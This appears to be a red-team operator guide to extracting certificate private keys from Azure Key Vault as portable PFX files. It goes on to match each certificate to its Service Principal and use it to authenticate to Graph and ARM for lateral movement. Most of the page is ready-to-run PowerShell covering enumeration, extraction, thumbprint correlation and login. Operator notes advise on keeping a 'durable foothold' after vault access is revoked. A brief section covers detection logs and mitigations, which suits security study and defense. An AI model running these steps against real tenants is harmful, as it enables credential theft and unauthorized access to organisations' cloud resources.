## Overview

Every certificate stored in Azure Key Vault has a backing secret that contains the full exportable PFX — including the private key. The `getSecret/action` data plane permission grants access to this secret. Unlike the `keys/sign` approach used in JWT assertion (where the key never leaves the vault), this technique retrieves the raw key material and writes it to disk as a portable `.pfx` file.

The extracted certificate can then be used to authenticate as the Service Principal it is registered to — against Graph, ARM, Key Vault, or Storage — and can be moved to any machine without further vault access.

Two tokens are required: an ARM token for the control plane (enumerating vaults and certificates) and a Key Vault token for the data plane (reading the secret). They are separate audiences and must be acquired independently.

## Preconditions

| Permission | Plane | Purpose |
|---|---|---|
| `Microsoft.KeyVault/vaults/read` | ARM (control) | Enumerate Key Vaults in the subscription |
| `Microsoft.KeyVault/vaults/certificates/read` | KV (data) | List certificates and retrieve metadata |
| `Microsoft.KeyVault/vaults/secrets/getSecret/action` | KV (data) | Read the backing secret containing the PFX |

Both tokens must be acquired for the same identity. ARM scope: `https://management.azure.com/.default`. Key Vault scope: `https://vault.azure.net/.default`.

## Two-Token Authentication

```powershell
# Authenticate with both tokens simultaneously
Connect-AzAccount `
    -AccessToken $ARM `
    -KeyVaultAccessToken $KeyVault `
    -AccountId "<user@tenant.com>"
```

Without the Key Vault token, `Get-AzKeyVaultSecret` will fail even if the ARM token has vault-level RBAC — the data plane enforces its own access control independently.

## Attack Chain

```
Acquire ARM token       →  scope: management.azure.com
Acquire KV token        →  scope: vault.azure.net
                        ↓
Enumerate vaults        →  Get-AzKeyVault → VaultName(s)
                        ↓
List certificates       →  Get-AzKeyVaultCertificate -VaultName <VAULT_NAME>
                        ↓
Extract backing secret  →  Get-AzKeyVaultSecret -VaultName <VAULT_NAME>
                           -Name <CERT_NAME> -AsPlainText
                           → returns base64-encoded PFX
                        ↓
Decode to PFX file      →  [Convert]::FromBase64String($secret)
                           → write bytes to disk as .pfx
                        ↓
Correlate thumbprint    →  match against app registrations' keyCredentials
                        ↓
Authenticate as SP      →  Connect-MgGraph / Connect-AzAccount with certificate
```

## Extraction

```powershell
# Enumerate vault and certificate name
$vaultName = (Get-AzKeyVault).VaultName
$certName  = (Get-AzKeyVaultCertificate -VaultName $vaultName).Name

# Extract the certificate as base64 PFX via getSecret
$secret     = Get-AzKeyVaultSecret -VaultName $vaultName -Name $certName -AsPlainText
$certBytes  = [Convert]::FromBase64String($secret)
[System.IO.File]::WriteAllBytes("C:\path\to\cert.pfx", $certBytes)
```

The resulting `.pfx` contains the full certificate and private key. No password is required unless the vault was configured to protect the export — check `SecretContentType` on the backing secret if authentication fails.

## Correlating the Certificate to a Service Principal

A cert thumbprint matches a specific app registration via its `keyCredentials`:

```powershell
$cert       = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList "C:\path\to\cert.pfx"
$thumbprint = $cert.Thumbprint

# Match against app registrations
Get-MgApplication -All | Where-Object {
    $_.KeyCredentials.CustomKeyIdentifier -contains [Convert]::FromBase64String(
        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($thumbprint))
    )
} | Select-Object DisplayName, AppId | Format-List

# Simpler: enumerate all apps and compare thumbprints manually
Get-MgApplication -All | ForEach-Object {
    $_.KeyCredentials | Where-Object { $_.DisplayName -or $_.Type -eq "AsymmetricX509Cert" }
} | Select-Object DisplayName, CustomKeyIdentifier, EndDateTime
```

Once the owning application is identified, its `AppId` is the client ID for authentication.

## Lateral Movement with the Extracted PFX

```powershell
$appId    = "<APP_CLIENT_ID>"
$tenantId = "<TENANT_ID>"
$certPath = "C:\path\to\cert.pfx"

# Graph
$cert = Get-PfxCertificate -FilePath $certPath
Connect-MgGraph -Certificate $cert -ClientId $appId -TenantId $tenantId

# ARM
Connect-AzAccount -ServicePrincipal -ApplicationId $appId `
    -Tenant $tenantId -CertificatePath $certPath

# Token acquisition via Operator Toolkit
# get_token.ps1 -Identity <APP_ID> -TenantId <TENANT_ID> -Scope graph -CertPath <PATH>
```

## Operator Notes

- This technique exports the key material — the PFX is portable and usable on any machine. Unlike `keys/sign`, there is no vault dependency after extraction.
- If the vault has a Key Vault Firewall configured to restrict access to specific IP ranges or VNets, the data plane request will be blocked regardless of token permissions. Check the vault's network rules during recon.
- Some organizations disable certificate export by setting `Exportable: false` on the certificate policy. In this case, `Get-AzKeyVaultSecret` returns the certificate without the private key — the PFX cannot be used for client authentication. Verify `Exportable` flag before counting on this vector.
- After extracting the PFX, enumerate what the Service Principal can reach via `entraId` and ARM before pivoting — understand the blast radius before exercising credentials.
- The extracted PFX remains valid until the certificate expires. Rotation or revocation closes the path retroactively.

## Comparison with JWT Assertion

| Approach | Private key exported? | Vault access required after extraction? | Use case |
|---|---|---|---|
| **PFX Extraction** (this page) | Yes — full PFX on disk | No — portable credential | Token requests from any machine |
| **JWT Assertion** | No — signing stays in vault | Yes — for each token request | Vault data plane access persists |

If vault access is persistent, JWT assertion is lower-risk operationally. If vault access may be revoked, extracting the PFX provides a durable foothold independent of the vault.

## Detection / Friction Points

- Key Vault diagnostic logs: `SecretGet` event for the backing secret — actor, vault name, secret name, and timestamp are recorded.
- If Key Vault logs are routed to Log Analytics or Microsoft Sentinel, `SecretGet` on a certificate secret is unusual and may trigger alerts.
- ARM-level events: `Get Key Vault` and `List Certificates` appear in the Activity Log.
- Certificate use for SP authentication shows in Entra ID sign-in logs under the application's sign-in events — `clientCredentialType: certificate`.
- Mitigation: restrict `getSecret/action` via Key Vault RBAC; use Key Vault Firewall to limit data plane access to trusted networks; set `Exportable: false` on certificate policies.

## Tooling

Full token acquisition (`get_token.ps1` in cert mode) and correlation utilities are in the Operator Toolkit on GitHub.
